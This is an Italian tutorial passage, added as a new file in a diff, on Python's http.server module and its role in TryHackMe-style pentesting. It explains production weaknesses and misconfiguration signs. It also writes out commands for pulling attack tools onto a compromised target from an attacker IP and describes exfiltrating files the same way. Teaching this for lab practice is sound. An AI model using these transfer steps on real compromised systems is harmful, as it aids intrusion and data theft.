@@ -1,0 +1,41 @@
+Un server HTTP è semplicemente un programma che sta in ascolto su una porta di rete, aspetta che arrivi una richiesta (quella che mandi tu con curl, o che manda un browser), la legge, decide cosa rispondere, e manda indietro una risposta.
+
+Il modulo http.server di Python
+Python include, nella sua libreria standard (nessuna installazione richiesta), un modulo chiamato http.server
+
+console
+$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+
+Cosa succede: Python avvia un server che espone la cartella corrente come file scaricabili, in ascolto sulla porta 8000. Se ora da un altro terminale (o da un'altra macchina) fai:
+
+console
+$ curl -s http://<IP-di-chi-ha-lanciato-il-comando>:8000/
+
+ricevi una pagina HTML autogenerata con l'elenco dei file di quella cartella, cliccabili/scaricabili. Prova a lanciarlo tu stesso in una cartella qualsiasi e visita http://localhost:8000/ dal browser — vedrai l'elenco dei file istantaneamente.
+
+Perché questo comando è ovunque nel pentesting
+
+Questo non è un dettaglio accademico — è probabilmente il comando Python più usato in assoluto durante un pentest, per un motivo molto pratico: trasferire file tra macchine.
+
+Scenario tipico che incontrerai spesso in TryHackMe: hai ottenuto accesso a una macchina target ma non hai un modo comodo per portarci sopra un tool (uno script di privilege escalation, un binario, una wordlist). La soluzione standard:
+
+Sulla tua macchina (attaccante), nella cartella dove sta lo script che vuoi trasferire:
+console
+   $ python3 -m http.server 8000
+Sulla macchina target, dalla shell che hai ottenuto:
+console
+   $ wget http://<tuo-IP>:8000/script.sh
+   # oppure
+   $ curl -O http://<tuo-IP>:8000/script.sh
+
+Il target scarica il file direttamente dalla porta 8000 della tua macchina. Nessuna configurazione, nessuna installazione — è per questo che è lo standard de facto: funziona ovunque Python sia installato (praticamente ogni Linux), con zero setup.
+
+Lo stesso identico meccanismo si usa al contrario: se vuoi esfiltrare un file dal target verso di te, avvii il server Python sul target ed esegui wget/curl dalla tua macchina.
+{: .prompt-tip }
+
+Perché non si usa MAI in produzione
+
+Punto importante per la tua formazione da pentester, perché è esso stesso un segnale di misconfigurazione da cercare: il server Python built-in è single-threaded per design (nella sua forma base) e non ha nessuna delle protezioni che un vero web server ha — niente gestione seria di concorrenza, niente hardening su header, niente rate limiting, niente TLS di default.
+
+Se durante un pentest trovi un servizio esposto che risponde in un modo che ricorda SimpleHTTPRequestHandler, è quasi sempre un segnale di ambiente di sviluppo o strumento interno lasciato acceso per sbaglio — esattamente la stessa categoria di misconfigurazione di cui parlavamo per Express esposto direttamente senza reverse proxy davanti.
